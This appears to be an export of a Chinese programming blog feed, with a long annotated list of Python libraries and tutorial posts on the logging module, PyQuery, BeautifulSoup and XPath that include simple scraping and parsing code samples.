queries,psycopg2函数库，用于PostgreSQL。dataset,存储Python字典数据,用于SQLite，MySQL和PostgreSQL。 cassandra-python-driver，开源分布式NoSQL数据库系统Apache Cassandra系统的Python驱动.pycassa,简化的cassandra数据库Python驱动。 HappyBase，友好的Apache [Hbase]的函数库。 PyMongo，MongoDB官方客户端。 Plyvel，LevelDB快速和功能丰富的Python接口。 redis-py,redis客户端。 py2neo,Python客户端(基于Neo4j的RESTful接口). telephus,基于Twisted的cassandra客户端。 txRedis，基于Twisted的Redis客户端。 在学习Python的过程中，往往因为没有资料或者没人指导从而导致自己不想学下去了，因此我特意准备了个群 592539176 ，群里有大量的PDF书籍、教程都给大家免费使用！不管是学习到哪个阶段的小伙伴都可以获取到自己相对应的资料！ 【网络】 Curl，Pycurl包是一个libcurl的Python接口，它是由C语言编写的。与urllib相比，它的速度要快很多。Libcurl是一个支持FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 和 LDAP的客户端URL传输库.libcurl也支持HTTPS认证,HTTP POST,HTTP PUT,FTP上传,代理,Cookies,基本身份验证,FTP文件断点继传,HTTP代理通道等等。 Requests，用Python语言编写，基于 urllib的开源 HTTP 库。它比 urllib 更加方便，更加 Pythoner。支持 Python3。 httpie，命令行HTTP客户端，用户友好的cURL的替换工具。 s3cmd，命令行工具，用于管理Amazon S3和CloudFront。 youtube-dl，命令行程序，从YouTube下载视频。 you-get，Python3写的视频下载工具，可用于YouTube/Youku优酷/Niconico视频下载Coursera，从coursera.org下载视频，可重新命名文件wikiteam，wiki下载工具。 subliminal，命令行工具，搜索和下载字幕的函数库。 requests，HTTP函数库，更加人性化。 grequests，异步HTTP请求+ Gevent（高性能高并发函数库）。 urllib3，一个线程安全的HTTP连接池，支持文件post。 httplib2，综合HTTP的客户端函数库。 treq， Python API接口，Twisted的HTTP客户。 Mininet，流行的网络仿真器,API采用python编写。 POX，基于Python的开源软件定义网络（SDN）控制开发平台的应用，如OpenFlow的SDN控制器。 Pyretic，SDN的编程语言，提供了强大的抽象在网络交换机或仿真器。 SDX Platform，基于SDN的IXP实现，利用最小网络，痘和热。 inbox.py，Python的SMTP服务器。 imbox， Python版本IMAP库。 inbox，收件箱，开源邮件工具包。 lamson,SMTP服务器。 flanker,侧卫,电子邮件地址和MIME解析库。 marrow.mailer,高性能可扩展邮件交付框架。 django-celery-ses， Django电子邮件后台，使用AWS SES和Celery。 modoboa，邮件托管和管理平台，包括现代和简化Web UI。 envelopes，邮件工具。 mailjet，批量邮寄mailjet API接口，带统计。 Talon，利爪，Mailgun库，提取消息和签名。mailjet- Mailjet API implementation for batch mailing, statistics and more., Talon - Mailgun library to extract message quotations and signatures.,pyzmail，编写，发送和解析电子邮件。 furl，燃料，小型的的URL解析库库。 purl，简单的，干净的API，操纵URL。 pyshorteners，纯Python库，URL短网址编辑。 short_url，短网址生成。 Scrapy，快速屏幕截取和网页抓取的框架。 portia，波西亚，Scrapy的可视化扩展。 feedparser，信息源解释器 RoboBrowser，简单的网页浏览Python函数库，没有使用Web浏览器。 MechanicalSoup，网站自动化互动测试工具包。 mechanize，网页浏览编程工具。 Demiurge，造物主，-PyQuery的轻量级工具。 newspaper,提取报纸新闻。 html2text,转换HTML为 Markdown格式的文本。 python-goose,HTML内容提取器。 lassie,莱西,人性化的网站内容检索。 micawber,通过UR抓提网页的函数库。 sumy，概要，文本和HTML网页的自动文摘模块。 Haul，距离，可扩展的图像爬虫。 python-readability,可读性工具Arc90,快速的Python接口。 opengraph,OpenGraphProtocol协议解析模块,textract，从任何文件，Word，PowerPoint，PDF文件中提取文本，等。 sanitize，消毒，使混乱的数据变的理智。 AutobahnPython， WebSocket和WAMP的函数库，使用 Twisted和PythonWebSocket-for-Python，websocket客户端和服务器端函数库。 SimpleXMLRPCServer，python标准库，简单的XML-RPC服务器，单线程。SimpleJSONRPCServer，JSON-RPC规范实施函数库。 zeroRPC，基于ZeroMQ和MessagePack的RPC实现。 apache-libcloud，所有云服务的Python接口库。 wifi，WiFi -一套个Python库和命令行工具与WiFi，用于[Linux]。 streamparse，运行Python代码和数据的实时流。集成了Apache Storm。 boto，亚马逊网络服务接口。 twython，Twitter推特API。 google-api-python-client，谷歌客户端API。 gspread，谷歌电子表格的Python API。 facebook-sdk，facebook平台Python SDK。 facepy，简易的facebook图形APIgmail，Gmail的Python接口。 django-wordpress，Django的WordPress的模型和视图。 Web框架 Django，最流行的Python-Web框架，鼓励快速开发,并遵循MVC设计，开发周期短ActiveGrid企业级的Web2.0解决方案Karrigell简单的Web框架，自身包含了Web服务，py脚本引擎和纯python的数据库 PyDBLitewebpy 一个小巧灵活的Web框架，虽然简单但是功能强大CherryPy基于Python的Web应用程序开发框架。 Pylons 基于Python的一个极其高效和可靠的Web开发框架 Zope 开源的Web应用服务器 TurboGears 基于Python的MVC风格的Web应用程序框架Twisted流行的网络编程库，大型Web框架。 QuixoteWeb开发框架Flask,轻量级web框架。 Bottle，快速，简单和轻量级的WSGI模式Web框架。 Pyramid，轻量级，快速，稳定的开源Web框架。 web2py，简单易用的全堆栈Web框架和平台。 web.py，强大、简单的Web框架。 TurboGears，便于扩展的Web框架。 CherryPy，极简Python Web框架，支持，HTTP 1.1和WSGI线程池。 Grok，基于Zope3的Web框架。 Bluebream，开源的Web应用服务器，原名Zope 3。 guava，轻量级，高性能的Python-Web框架，采用c语言编写。 django-cms，基于Django企业级开源CMS。 djedi-cms轻量级但功能强大的Django CMS的插件，内联编辑和性能优化。 FeinCMS，基于Django的先进内容管理系统。 Kotte，高层次的Python的Web应用框架，基于Pyramid。 Mezzanine，强大，一致，灵活的内容管理平台。 Opps，基于Django的CMS，用于高流量的报纸、杂志和门户网站。 Plone，基于Zope的开源应用服务器Zope。 Quokka，灵活，可扩展的，轻量级的CMS系统，使用Flask和MongoDB。 Wagtail，Django内容管理系统。 Widgy，CMS框架，基于Django。 django-oscar，Django奥斯卡，开源的电子商务框架。 django-shop，基于Django的网店系统。 merchant，支持多种付款处理工具。 money，可扩展的货币兑换解决方案。 python-currencies，货币显示格式。 cornice，Pyramid的REST框架。 django-rest-framework，Django框架，强大灵活的工具，可以很容易地构建Web API。 django-tastypie，创造精美的Django应用程序API接口。 django-formapi，创建JSON API、HMAC认证和Django表单验证。 flask-api，提供统一的浏览器体验，基于Django框架。 flask-restful，快速构建REST API支持扩展。 flask-api-utils，flask的扩展。 falcon，猎鹰，高性能的Python框架，构建云API和Web应用程序后端。 eve，夏娃，REST API框架，使用Flask，MongoDB和良好意愿。 sandman，睡魔，为现有的数据库驱动的系统，自动生成REST API。 restless，类似TastyPie的框架。 savory-pie，REST API构建函数库（Django，及其他）Jinja2，现代设计师友好的语言模板。 Genshi，网络感知输出模板工具包。 Mako，马可，Python平台的超高速、轻型模板。 Chameleon，变色龙，一个HTML / XML模板引擎。仿照ZPT，优化速度。 Spitfire，快速的Python编译模板。 django-haystack,大海捞针,Django模块搜索。 elasticsearch-py,Elasticsearch官方低级的Python客户端。 solrpy,solr客户端。 Whoosh,呼,快速，纯Python搜索引擎库。 Feedly，建立新闻和通知系统的函数库，使用Cassandra和Redis。 django-activity-stream,Django活动流,从你网站上的行动,产生通用的活动流。 Beaker，烧杯，一个缓存和会话使用的Web应用程序，独立的Python脚本和应用程序库。 dogpile.cache，是Beaker作者的下一代替代作品。 HermesCache，Python的缓存库，基于标签的失效及预防Dogpile效果。 django-cache-machine，Django缓存机，自动缓存失效，使用ORM。 django-cacheops，自动颗粒事件驱动，ORM缓存失效。 johnny-cache,约翰尼高速缓存框架,Django应用程序。 django-viewlet,渲染模板部件扩展缓存控制。 pylibmc,在libmemcached接口。 WTForms-JSON,JSON表单数据处理扩展。 Deform， HTML表单生成的函数库。 django-bootstrap3，bootstrap3，集成了Django。 django-crispy-forms，Django程序，可以创建优雅的表单。 django-remote-forms，Django的远程表单，Django表格的序列化程序。 django-simple-spam-blocker，Django简单的垃圾邮件拦截器。 django-simple-captcha，Django简单验证码，简单的和高度可定制的Django应用程序，用于添加验证码图像Ajenti，服务器管理面板。 Grappelli，界面花哨的django皮肤。 django-suit，Django替代o界面（仅用于非商业用途）。 django-xadmin，Django管理面板替代工具。 flask-admin，简单的flask管理界面框架flower，实时监控和Web管理面板。 Pelican，鹈鹕，Markdown或ReST，字王内容主题。支持 DVCS, Disqus. AGPL。 Cactus,仙人掌,设计师的网站静态生成器。 Hyde，海德， 基于Jinja2的静态网站生成器。 Nikola，尼古拉-一个静态网站和博客生成器。 Tags，标签，最简单的静态网站生成器。 Tinkerer，工匠，基于Sphinx的静态网站生成器。 asyncio，（在Python 3.4 +是Python标准库），异步I/O，事件循环，协同任务。 gevent，基于Python的网络库。 Twisted，扭曲，事件驱动的网络引擎。 Tornado，龙卷风，Web框架和异步网络的函数库。 pulsar，脉冲星，事件驱动的并行框架的Python。 diesel，柴油，绿色的，基于事件的I/O框架。 eventlet，WSGI支持异步框架。 pyzmq， 0MQ消息库的Python封装。 txZMQ,基于Twisted的0MQ消息库封Crossbar,开源统一应用路由器（WebSocket和WAMP）。 wsgiref，Python标准库，WSGI封装实现，单线程。 Werkzeug，机床，WSGI工具函数库，很容易地嵌入到你自己的项目框架。 paste，粘贴，多线程，稳定的，久经考验的WSGI工具。 rocket，火箭，多线程服务，基于Pyramid。 netius，快速的、异步WSGI服务器，gunicorn，forked前身，部分用C写的。 fapws3，异步网络，用C写的。 meinheld，异步WSGI服务器，是用C写的。 bjoern，-快速的、异步WSGI服务器，用C写的。 安全 Permissions函数库，允许或拒绝用户访问数据或函数。 django-guardian,Django守护者，管理每个对象的权限，用于Django 1.2 +Carteblanche，管理导航和权限。 Authomatic，简单强大的认证/授权客户端。 OAuthLib， 通用，规范，OAuth请求签约工具。 rauth，用于OAuth 1.0，2.0，的Python库。 python-oauth2，利用全面测试，抽象接口来创建OAuth的客户端和服务器。 python-social-auth，易于安装的社会认证机制。 django-oauth-toolkit,Django OAuth工具包django-oauth2-provider,Django OAuth2工具包。 django-allauth，Django认证的应用程序。 Flask-OAuthlib，Flask的OAuth工具包sanction，制裁，简单的oauth2客户端。 jose，[JavaScript]对象签名和加密(JOSE)草案实施，标记状态。 python-jwt，JSON的Web令牌生成和验证模块。 pyjwt，JSON的Web令牌草案01。 python-jws，JSON的Web令牌草案02。 PyCrypto，Python的加密工具包。 Paramiko，sshv2协议的实现，提供了客户端和服务器端的功能。 cryptography，密码开发工具包。 PyNac，网络和密码（NaCl）函数库。 hashids，hashids的 Python函数库。 Passlib，安全的密码存储/哈希库，非常高的水平。 hashlib,md5, sha等hash算法，用来替换md5和sha模块，并使他们的API一致。 它由OpenSSL支持，支持如下算法：md5,sha1, sha224, sha256, sha384, sha512. GUI库 名称简介PyGtk，基于Python的GUI程序开发GTK+库PyQt用于Python的QT开发库WxPythonPython下的GUI编程框架，其消息机制与MFC的架构相似,入门非常简单，需要快速开发相关的应用可以使用这个TkinterPython下标准的界面编程包，因此不算是第三方库了PySide，跨平台Qt的应用程序和用户界面框架，支撑Qt v4框架。 wxPython，混合wxWidgets的C++类库。 kivy，创建应用程序GUI函数库，看运行于Windows，Linux，MAC OS X，[Android]和[iOS]。 curse，用于创建终端GUI应用程序。 urwid，创建终端GUI应用程序窗体的函数库，支持事件，色彩丰富。 pyglet，跨平台的窗口和多媒体库的Python。 Tkinter，是Python事实上的标准GUI软件包。 enaml，创建漂亮的用户界面，语法类似QML。 Toga，托加，OS原生GUI工具包。【构建封装】 pyenv,简单的Python版本管理。 virtualenv,创建独立的Python环境，用于同时安装不同版本的python环境。 virtualenvwrapper，是virtualenv的一组扩展。 pew,一套管理多个虚拟环境的工具。 vex，使运行指定的virtualenv命令。 PyRun，一个单文件，无需安装的Python版本管理工具。 PIP，Python包和依赖的管理工具。 easy_install，软件包管理系统,提供一个标准的分配Python软件和 函式库的格式。是一个附带设置工具的模块，和一个第三方函式库。旨在加快Python函式库的分配程式的速度。类似Ruby语言的RubyGems 。 conda，跨平台，二进制软件包管理器。 Curdling，一个管理Python包的命令行工具。 wheel，Python发行的新标准，旨在替代eggs.cx-Freeze，跨平台的，用于打包成可执行文件的库 py2exe, Windows平台的Freeze脚本工具，Py2exe ，将python脚本转换为windows上可以独立运行的可执行程序py2app，MAC OS X平台的Freeze脚本工具。 pyinstaller，-转换成独立的可执行文件的Python程序（跨平台）。 pynsist,构建Windows安装程序的工具，用Python编写。 dh-virtualenv,建立和分发virtualenv(Debian软件包格式) PyPI，新一代的Python包库管理工具。warehouse,新一代的Python包库（PyPI）管理工具。 devpi，PyPI服务器和包装/测试/发布工具。 localshop，PyPI官方包镜像服务器，支持本地（私人）包上传。 buildout，创建，组装和部署应用程序的多个部分，其中一些可能是非基于Python的。 SCons，软件构造工具。 platformio，一个控制台的工具，构建的代码可用于不同的开发平台。 bitbake，特殊设计的工具，用于创建和部署[嵌入式]Linux软件包 fabricate，自动为任何编程语言，生成依赖包。 django-compressor，Django压缩机，压缩和内联JavaScript或CSS，链接到一个单一的缓存文件。 jinja-assets-compressor，金贾压缩机，一个Jinja扩展，通过编译，压缩你的资源。 webassets，优化管理，静态资源，独特的缓存清除。 fanstatic，球迷，包优化，提供静态文件。 fileconveyor，监控资源变化，，可保存到CDN（内容分发网络）和文件系统。 django-storages，一组自定义存储Django后台。 glue，胶胶，一个简单的命令行工具，生成CSS Sprites。 libsass-python，Sass (层叠样式表)的Python接口。 Flask-Assets，整合应用程序资源。【代码调试】 unittest，Python标准库，单元测试框架。 nose，鼻子，unittest延伸产品。 pytest，成熟的全功能的Python测试工具。 mamba，曼巴，Python的权威测试工具，出自BDD的旗下。 contexts，背景，BDD测试框架，基于C#。 pyshould，should风格的测试框架，基于PyHamcrest.pyvows，BDD风格测试框架Selenium，web测试框架，Python绑定Selenium。 splinter，分裂，测试Web应用程序的开源工具。 locust，刺槐，可扩展的用户负载测试工具，用Python写的。 sixpack，语言无关的A/B测试框架。 mock，模拟对象（英语：mock object，也译作模仿对象），模拟测试库。 responses，工具函数，用于mock模拟测试。 doublex-强大的测试框架。 freezegun，通过时间调整，测试模块。 httpretty， HTTP请求的模拟工具。 httmock，mock模拟测试。 coverage，代码覆盖度量测试。 faker，生成模拟测试数据的Python包。 mixer，混频器，产生模拟数据，用于Django ORM，SQLAlchemy，Peewee, MongoEngine, Pony ORM等model_mommy，在Django创建测试随机工具。 ForgeryPy，易用的模拟数据发生器。 radar，雷达，生成随机日期/时间。 FuckIt.py，测试Python代码运行。 Code Analysispysonar2，Python类型索引。 pycallgraph,可视化的流量（调用图）应用程序。 code2flow,转换Python和JavaScript代码到流程图。 LinterFlake8，源代码模块检查器pylama，Python和JavaScript代码审计工具。 Pylint，源代码分析器，它查找编程错误，帮助执行一个代码标准和嗅探一些代码味道。注意：相比于PyChecker，Pylint是一个高阶的Python代码分析工具，它分析Python代码中的错误。 Pyflakes，一个用于检查Python源文件错误的简单程序。Pyflakes分析程序并且检查各种错误。它通过解析源文件实现，无需导入。 pdb,Python标准库,Python调试器。 ipdb,IPython使用的PDB。 winpdb，独立于平台的GUI调试器。 pudb，全屏，基于python调试控制台。 pyringe，-可附着于及注入代码到Python程序的调试器。 python-statsd，statsd服务器客户端。 memory_profiler， 内存监视。 profiling，交互式Python分析器。 django-debug-toolbar, Django调试工具栏,显示各种调试信息:当前请求/响应。django-devserver,Django调试工具。 flask-debugtoolbar,flask调试工具。 （完） document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-logging模块]]></title>
    <url>%2Fposts%2Fdc0c5108%2F</url>
    <content type="text"><![CDATA[为什么会用logging模块 灵活性好，方便配置 输出或保存不同级别日志 logging模块结构logging 在源码中有三个文件,结构如下: ├── config.py ├── handlers.py └── __init__.py __int__.py中实现了基础功能,主要的逻辑就在这个文件中 handlers.py是一些Handlers用起来很方便的. config.py是对配置做处理的方法. 基础import logging # 1.初始化 相当于 logger = logging.getLogger("test_name") # 2.设置级别 logger.setLevel(logging.DEBUG) # 低于这个级别就不去管他 # 3. 定义handler: # 在控制台输出 FileHandler sh = logging.StreamHandler() # 定义控制台输出 sh.setLevel(logging.ERROR) # 设置最低级别 达到什么级别的时候管 低于..不执行 # 写在文件里面 SteamHandler fh = logging.FileHandler(r'file_test.log') fh.setLevel(logging.DEBUG) # 达到什么级别就写到文件里面去 # 4. 格式化输出 formatter 注意之间逗号不需要加，只是为了美观 formatter = logging.Formatter( '时间：%(asctime)s,' '日志级别:%(levelname)s,' '日志信息：%(message)s,' ) sh.setFormatter(formatter) # 设置控制台的样式 fh.setFormatter(formatter) # 设置文件的样式 # 添加进去 logger.addHandler(sh) logger.addHandler(fh) if __name__ == '__main__': logger.debug('测试中') logger.info('正常运行') logger.warn('警告') logger.error('完了error') logger.critical('炸了') # 例如： def func(a): try: num = 40/a logger.info(num) # 正常的话记录 except Exception as e: logger.error(e) # 将错误记录 func(0) ## logging 中的级别 """ DEBUG：调试信息，通常在诊断问题的时候用得着； INFO：普通信息，确认程序安装预期运行； WARNING：警告信息，表示发生了意想不到的事情，或者指示接下来可能会出现一些问题，但是程序还是继续运行； ERROR：错误信息，程序运行中出现了一些问题，一些功能没有执行； CRITICAL：危险信息，一个严重的错误，导致程序无法继续运行。 # 对应下面5个方法 debug info Warning error critical """ logging常用的格式化: document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>logging</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-PyQuery]]></title>
    <url>%2Fposts%2F3176db18%2F</url>
    <content type="text"><![CDATA[Python爬虫解析库，主流的有 PyQuery Beautifulsoup Scrapy Selectors 正则表达式。 PyQuery和scrapy Selectors都是基于lxml模块，而lxml和正则表达式都是C语言写的，只有Beautifulsoup是用纯Python编写的，所以在实测中，Beautifulsoup 的解析速度比其他几种慢了5倍以上！ 正则表达式的构造稍微复杂一点，一般在结构化的网页中没必要用正则（易出错）; Scrapy Selectors支持css，xpath以及正则表达式 ; PyQuery只支持css（css语法更精简一些），类似于jQuery Scrapy Selector中的css语法和PyQuery中的略有不同，本文以PyQuery为例（不用Scrapy框架的话，PyQuery就够用了） 安装pip3 install pyquery 使用初始化import requests from pyquery import PyQuery as pq url = 'https://www.guokr.com/' r = requests.get(url) # 实例化 doc = pq(r.text) 获取元素跟jQuery是一样的，也就不细说了，简单举几个小例子 # 1.获取class是content-title的元素 # class是点. id是# print(doc('h2.content-title')) # 获取果壳网 # 2.获取标签的文本内容 print(doc('h2.content-title').text()) # 3.遍历（先items()） lis = doc('h2.content-title').items() for li in lis: print(li.text()) # 4. 获取class为content的div标签下面的ul下面的li # 用空格表示子孙节点 lis = doc('div.content ul li').items() #lis = doc('div.content li').items() for i in lis: print(i.text()) # 5. 如果类名不唯一，还可以加上其他的类名一起定位 print(doc('div.cont.a.b.c.d')) # 标签里的空格表示`并列`，表示这个div标签有cont,a,b,c,d这五个类名，但在css语法里空格表示`嵌套`，所以我们要添加其他类名的时候`不能输入空格`，而是直接用`小数点`来添加其他类名 # 6. 获取属性 attr("属性名") lis = doc('div.content li').items() for i in lis: print(i.text(),i('a').attr('href')) # 7. 其他的一些选择器 lis = doc('div.content ul li') #父节点,包含父节点的所有子孙节点的内容 #相当于 #print(doc('div.content ul')) print(lis.parent()) #祖先节点,就相当于所有源代码了 print(lis.parents()) #兄弟节点,即同级节点，不包含自己 print(lis.siblings) 其他技巧1.伪类选择器 #第二个标签 lis = doc('div.content li:nth-child(2)').items() for i in lis: print(i.text(),i('a').attr('href')) # 第一个a标签的语法是 a:first-child,最后一个是a:last-child,其它位置的语法如上图所示，第几个括号里就是几（当然第一个你也可以写成 li:nth-child(1)) 类似的 #div.content 下面第二个（含）之后的li标签 lis = doc('div.content li:gt(1)').items() for i in lis: print(i.text(),i('a').attr('href')) # gt就是greater than,大于的意思，lt (less than)是小于 筛选文本 lis = doc('div.content ul').items() for i in lis: #文本包含问号的li标签 print(i("li:contains('？')").text()) 2.修改标签属性 #用remove把特定标签移除，然后再进行遍历 lis = doc('div.content ul').remove('.content-article').items() for i in lis: print(i.text()) # 还有如修改属性，增加css之类的一些使用率较低的，用到的时候去官方文档查 ###### 直接在Chrome里调试 Chrome浏览器自带css的查询方法，按f12或者右键检查，打开Elements面板，按ctrl+f， 这里支持xpath，css语法，以及普通的字符查找 要注意的是右边的数字，显示的是满足条件的标签数量，可以按向下的箭头过一遍，看看是不是自己想要的信息。 京东的商品栏目 import requests from pyquery import PyQuery as pq url = 'https://www.jd.com/' r = requests.get(url) # 实例化 doc = pq(r.text) flag = 1 # for i in doc("li.cate_menu_item:nth-child(3) a").items(): for i in doc("li.cate_menu_item:gt(1) a").items(): # print(i.text()) print(i.attr('href')) print(i.text()) flag = flag + 1 print("------------") print(flag) 参考文章：https://www.jianshu.com/p/7eb136bbe317 更多用法：https://pythonhosted.org/pyquery/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>PyQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-Beautifulsoup]]></title>
    <url>%2Fposts%2Fa2109bc%2F</url>
    <content type="text"><![CDATA[Beautifulsoup也是用来解析网页数据的 BeautifulSoup对象四种类型: tag NavigableString BeautifulSoap Comment 初始化安装pip3 install beautifulsoup4 导入from bs4 import BeautifulSoup 使用from bs4 import BeautifulSoup soup = BeautifulSoup(html_doc, 'html.parser') print(soup.title) 查找基本soup = BeautifulSoup(open("index.html")) #文件句柄 soup = BeautifulSoup("&lt;html>data&lt;/html>") #字符串 find 和 find_all搜索当前 tag 的所有 tag 子节点，并判断是否符合过滤器的条件 语法： find(name=None, attrs={}, recursive=True, text=None, **kwargs) find_all(name=None, attrs={}, recursive=True, text=None, limit=None, **kwargs) 通过 attrs 参数传递： data_soup = BeautifulSoup('&lt;div data-foo="value">foo!&lt;/div>') print(data_soup.find_all(attrs={"data-foo": "value"})) 按 class_ 查找: css_soup = BeautifulSoup('&lt;p class="body bold strikeout">&lt;/p>') print(css_soup.find_all("p", class_="strikeout")) print(css_soup.find_all("p", class_="body")) 其他搜索方法： find_parents() # 返回所有祖先节点 find_parent() # 返回直接父节点 find_next_siblings() # 返回后面所有的兄弟节点 find_next_sibling() # 返回后面的第一个兄弟节点 find_previous_siblings() # 返回前面所有的兄弟节点 find_previous_sibling() # 返回前面第一个兄弟节点 find_all_next() # 返回节点后所有符合条件的节点 find_next() # 返回节点后第一个符合条件的节点 find_all_previous() # 返回节点前所有符合条件的节点 find_previous() # 返回节点前所有符合条件的节点 从文档中找到所有a标签的链接: for link in soup.find_all('a'): print(link.get('href')) 从文档中获取所有文字内容: print(soup.get_text()) 对象TagTag对象与XML或HTML原生文档中的tag相同 tag中最重要的属性: name和attributes name tag.name # 复赋值 tag.name = "xxx" attributes 一个tag可能有很多个属性，一个属性可能有很多个值。 `python 获取tag的指定属性的属性值tag[‘class’] 获取tag的全部属性及属性值:tag.attrs tag属性及属性值添加tag[‘class’] = ‘row’ 属性值的删除del tag[‘class’] 查看属性值print(tag.get(‘class’)) 多值属性tag： 返回类型一般是list,但当某个属性在任何版本的HTML定义中都没有被定义为多值属性时，会将这个属性作为字符串返回 ```python css_soup = BeautifulSoup('&lt;p class="body row"&gt;&lt;/p&gt;') css_soup.p['class'] # ["body", "row"] css_soup = BeautifulSoup('&lt;p class="body"&gt;&lt;/p&gt;') css_soup.p['class'] # ["body"] id_soup = BeautifulSoup('&lt;p id="my id"&gt;&lt;/p&gt;') id_soup.p['id'] # 'my id' 如果转换的文档是XML格式,那么tag中不包含多值属性 获取tag某个子节点: soup.tag名， soup.a 获取tag全部子节点: .contents 和 .children 获取tag全部子节点及子孙节点：.descendants for child in head_tag.descendants: print(child) 节点内的字符串: # .string head_tag.string # .strings 如果tag中包含多个字符串`.strings` 来循环获取 head_tag.strings for string in soup.strings: print(repr(string)) # .stripped_strings 去除空行空白 for string in soup.stripped_strings: print(repr(string)) 父亲节点：.parent 所有父辈节点：.parents 兄弟节点: .prettify(), 其中next_sibling和previous_sibling是前后兄弟 回退和前进： 通过 .next_elements 和 .previous_elements 的迭代器就可以向前或向后访问文档的解析内容,就好像文档正在被解析一样 find_all# 过滤str soup.find_all('b') # 过滤正则 for tag in soup.find_all(re.compile("^b")): print(tag.name) # 过滤多个 soup.find_all(["a", "b"]) # True:可以匹配任何值,下面代码查找到所有的`一级`tag for tag in soup.find_all(True): print(tag.name) # limit 显示返回数量 soup.find_all("a", limit=2) # 只搜索tag的直接子节点, soup.html.find_all("title", recursive=False) def test(tag): #包含 class 属性却不包含 id 属性 return tag.has_attr('class') and not tag.has_attr('id') # 调用 soup.find_all(test) #下面两行代码是等价的 soup.find_all('div', limit=1) soup.find('div') 区别:find_all() 方法的返回结果是值包含一个元素的列表,而 find() 方法直接返回结果.find_all() 方法没有找到目标是返回空列表, find() 方法找不到目标时,返回 None NavigableString可遍历字符串 通过 unicode() 方法可以直接将 NavigableString 对象转换成Unicode字符串: unicode_string = unicode(tag.string) BeautifulSoup表示的是一个文档的全部内容,可以把它当作 Tag 对象，是一个特殊的 Tag，我们可以分别获取它的类型，名称，以及属性。 Commenthtml_doc='&lt;a href="http://z.com" class="row" id="box">&lt;!-- hhh -->&lt;/a>' soup = BeautifulSoup(html_doc, 'html.parser') print(soup.a.string) # hhh print(type(soup.a.string)) # &lt;class 'bs4.element.Comment'> """ a 标签里的内容实际上是注释，但是如果我们利用 .string 来输出它的内容，我们发现它已经把注释符号去掉了，所以这可能会给我们带来不必要的麻烦。 """ # 在使用前最好做一下判断 if type(soup.a.string)==bs4.element.Comment: print soup.a.string document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Beautifulsoup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-XPath]]></title>
    <url>%2Fposts%2F12481%2F</url>
    <content type="text"><![CDATA[XPathXPath，全称 XML Path Language，即 XML 路径语言，它是一门在 XML 文档中查找信息的语言。最初是用来搜寻 XML 文档的，但同样适用于 HTML 文档的搜索。所以在做爬虫时完全可以使用 XPath 做相应的信息抽取。 python库lxml的安装pip3 install lxml XPath常用规则 表达式 描述 nodename 选取此节点的所有子节点 / 从当前节点选取直接子节点 // 从当前节点选取子孙节点 . 选取当前节点 .. 选取当前节点的父节点 @ 选取属性 * 通配符，选择所有元素节点与元素名 @* 选取所有属性 [@attrib] 选取具有给定属性的所有元素 [@attrib=’value’] 选取给定属性具有给定值的所有元素 [tag] 选取所有具有指定元素的直接子节点 [tag=’text’] 选取所有具有指定元素并且文本内容是text节点 XPath中的运算符 运算符 描述 实例 返回值 or 或 age=19 or age=20 如果age等于19或者等于20则返回true反正返回false and 与 age&gt;19 and age&lt;21 如果age等于20则返回true，否则返回false mod 取余 5 mod 2 1 \ 取两个节点的集合 //book \ //cd 返回所有拥有book和cd元素的节点集合 + 加 6+4 10 - 减 6-4 2 * 乘 6*4 24 div 除法 8 div 4 2 = 等于 age=19 true != 不等于 age!=19 true &lt; 小于 age&lt;19 true &lt;= 小于或等于 age&lt;=19 true &gt; 大于 age&gt;19 true &gt;= 大于或等于 age&gt;=19 true 解析方式from lxml import etree text=''' &lt;div> &lt;ul> &lt;li class="item-0">&lt;a href="link1.html">第一个&lt;/a>&lt;/li> &lt;li class="item-1">&lt;a href="link2.html">second item&lt;/a>&lt;/li> &lt;li class="item-0">&lt;a href="link5.html">a属性&lt;/a> &lt;/ul> &lt;/div> ''' # 1.读取文本解析节点 html=etree.HTML(text) #初始化生成一个XPath解析对象 result=etree.tostring(html,encoding='utf-8') #解析对象输出代码 # 2.读取HTML文件进行解析 html=etree.parse('test.html',etree.HTMLParser()) #指定解析器HTMLParser会根据文件修复HTML文件中缺失的如声明信息 result=etree.tostring(html) #解析成字节 #result=etree.tostringlist(html) #解析成列表 获取元素节点# 1.获取所有节点 // from lxml import etree html=etree.parse('test.html',etree.HTMLParser()) result=html.xpath('//*') #//代表获取子孙节点，*代表获取所有 # 如要获取li节点，可以使用//后面加上节点名称，然后调用xpath()方法 html.xpath('//li') #获取所有子孙节点的li节点 # 2.获取子节点 / result=html.xpath('//li/a') #通过追加/a选择所有li节点的所有直接a节点，因为//li用于选中所有li节点，/a用于选中li节点的`所有直接子节点a` # 3.获取父节点 .. parent:: # 